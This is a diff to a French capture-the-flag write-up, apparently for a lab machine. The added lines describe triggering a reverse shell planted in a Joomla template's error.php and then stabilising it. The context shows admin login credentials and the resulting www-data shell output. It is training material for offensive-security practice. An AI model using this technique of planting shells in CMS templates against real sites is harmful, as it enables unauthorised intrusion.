@@ -379,6 +379,10 @@ Commençons par nous connecter à Joomla avec les crédentiels **admin:abcd1234*
 
 <figure><img src=".gitbook/assets/beez3_reverseshell_ error_php.png" alt=""><figcaption><p>reverse shell paste dans error.php</p></figcaption></figure>
 
+Affichons la page error.php dans firefox
+
+**http://10.10.238.221:8080/templates/beez3/error.php**
+
 <figure><img src=".gitbook/assets/firefox_reverseshell.png" alt=""><figcaption><p>reverse shell firefox</p></figcaption></figure>
 
 ```
@@ -397,3 +401,5 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
 www-data@ubuntu:/$  
 ```
+
+Comme à chaque fois, consolidons ce shell
